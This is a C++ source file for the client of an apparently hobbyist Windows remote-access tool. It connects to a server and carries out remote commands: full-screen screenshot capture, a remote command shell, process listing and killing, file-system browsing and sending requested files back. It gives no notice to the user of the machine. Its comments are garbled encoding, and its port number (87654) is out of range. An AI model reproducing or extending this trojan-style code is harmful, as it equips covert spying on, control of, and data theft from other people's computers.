#include "MySocket.h"



void RecvMes(MySocket* pSocket);

MySocket::MySocket()
{
    nIndex = 0;
    pCmd = NULL;
    pPro = NULL;
    pFile = NULL;
}


MySocket::~MySocket()
{
}
//winƽ̨socket������Ҫ��
void MySocket::Start()
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return;
    }

}



bool  MySocket::Connect()
{
    m_sSever = socket(AF_INET, SOCK_STREAM, 0);

    sockaddr_in addr;
    addr.sin_port = htons(87654);
    addr.sin_family = AF_INET;
    addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");

    int nRet=connect(m_sSever,(sockaddr*)&addr, sizeof(sockaddr_in));

    
    if(nRet==0)
    {
        std::thread t(RecvMes, this);
        t.join();
        return true;
    }
    return false;

 
}


bool MySocket::Recv(SOCKET s, char szbuf[],int nLenth)
{
    int nRet=recv(s, szbuf, nLenth,0);
    if (SOCKET_ERROR == nRet||nRet==0) 
    {
        return false;
    }
    return true;
}



bool MySocket::RecvData(SOCKET s, char* pBuf, int nLength) {

    int nTotalSize = 0;
    while (nTotalSize < nLength) {
        int nRet = recv(s,
            pBuf + nTotalSize,
            nLength - nTotalSize,
            0);
        if (nRet > 0) {
            nTotalSize += nRet;
        }
        else {
            return false;
        }
    }

    return true;
}

void MySocket::InitCmd()
{

    if (pCmd == NULL)
    {
        pCmd = new Cmd;
        pCmd->CreateCmd(m_sSever);
    }
  
}

void MySocket::InitPro()
{
    if (pPro == NULL)
    {
        pPro = new CProcess(m_sSever);
        pPro->GetProcess();
    }
}

void MySocket::InitFile()
{
    if (pFile == NULL)
    {
        pFile = new Cfile(m_sSever);     
    }
}
int CutWindows(MySocket* pSocket)
{
    RECT rec = { 0 };
    //��ȡ������
    HWND hdesk = GetDesktopWindow();
    //��ȡ����DC
    HDC hdc = GetDC(hdesk);
    //��������DC
    HDC hMemDC = CreateCompatibleDC(hdc);

    //����һ����������ݵ�λͼ
    GetClientRect(hdesk, &rec);

    HBITMAP hbit = CreateCompatibleBitmap(hdc, rec.right - rec.left, rec.bottom - rec.top);
    SelectObject(hMemDC, hbit);

    //
    BitBlt(hMemDC, 0, 0, rec.right - rec.left, rec.bottom - rec.top, hdc, 0, 0, SRCCOPY);

    int nBimpSize = 4 * (rec.right - rec.left)*(rec.bottom - rec.top);
    char* pDate = new char[nBimpSize + 8];

    int nX = GetSystemMetrics(SM_CXSCREEN);
    int nY = GetSystemMetrics(SM_CYSCREEN);
    *(int*)(pDate) = nX;
    *((int*)(pDate)+1) = nY;

    GetBitmapBits(hbit, nBimpSize, pDate + 8);


    DeleteDC(hMemDC);
    ReleaseDC(hdesk, hdc);
    DeleteObject(hbit);


    //���

    int nAcoll = nBimpSize + 8 + sizeof(tagHead);
    tagHead* ptagHead = (tagHead*)new char[nAcoll];

    ptagHead->bType = SEND_WINDOWS;
    ptagHead->nDate = nBimpSize + 8;
    //ѹ����Ĵ�С
    uLong blen = compressBound(nBimpSize + 8);
    char* buf = new char[blen];
    //ѹ��
    compress((Bytef *)buf, &blen, (Bytef *)pDate, nBimpSize + 8);
    ptagHead->nDateSize = blen;
    //(char*)ptagHead + sizeof(tagHead)
    memcpy((char*)ptagHead + sizeof(tagHead), buf, blen);
    send(pSocket->m_sSever, (char*)ptagHead, ptagHead->nDateSize + sizeof(tagHead), 0);


    //�ͷ�
    delete[] buf;
    delete[] pDate;
    delete ptagHead;

    return nBimpSize + 8;
}



void RecvMes(MySocket* pSocket)
{

    while (1)
    {
        char szHead[9] = { 0 };
        //���հ�ͷ
        pSocket->RecvData(pSocket->m_sSever, szHead, sizeof(tagHead));
        tagHead* ptag = (tagHead*)szHead;
        switch (ptag->bType)
        {
        case CUT_WINDOWS:
        {

            CutWindows(pSocket);
        }
        break;
        case CUT_CMD:
        {
            pSocket->InitCmd();
            char* pDate = new char[ptag->nDate];
            pSocket->RecvData(pSocket->m_sSever, pDate, ptag->nDate);
            pSocket->pCmd->RecvCommnd(pDate, ptag->nDate);
            delete[] pDate;
        }
        break;
        case CUT_PROCESS:
        {
            pSocket->InitPro();
            pSocket->pPro->SendProcess();
        }
        break;
        case CUT_END:
        {
            char* pDate = new char[ptag->nDate];
            pSocket->RecvData(pSocket->m_sSever, pDate, ptag->nDate);
            int nPid = atoi(pDate);
 
            HANDLE handle=OpenProcess(PROCESS_ALL_ACCESS, FALSE,nPid);
            BOOL bRet=TerminateProcess(handle,0);
            if (bRet)
            {
                SendData(pSocket->m_sSever, SEND_END, pDate, ptag->nDate);
            } 
            delete[] pDate;
        }
        break; 
        case CUT_FILE:
        {
           
            if (ptag->nDate == 0)
            {
                pSocket->InitFile();
                pSocket->pFile->EnumDevir();
            }
            else
            {
                char* pDate = new char[ptag->nDate];
                pSocket->RecvData(pSocket->m_sSever, pDate, ptag->nDate);
                pSocket->pFile->EnumFile(pDate);
                delete[] pDate;
            }
           
            pSocket->pFile->SendfileName(); 
        }
        break;
        case CUT_DOWNLOAD:
        {
            char* pDate = new char[ptag->nDate];
            pSocket->RecvData(pSocket->m_sSever, pDate, ptag->nDate);
            pSocket->pFile->SendFile(pDate);
            delete[] pDate;
        }
        break;
        case CUT_HEART:
        {
            SendData(pSocket->m_sSever, SEND_HEART, NULL, 0);
        }
        break;
        }
    }
}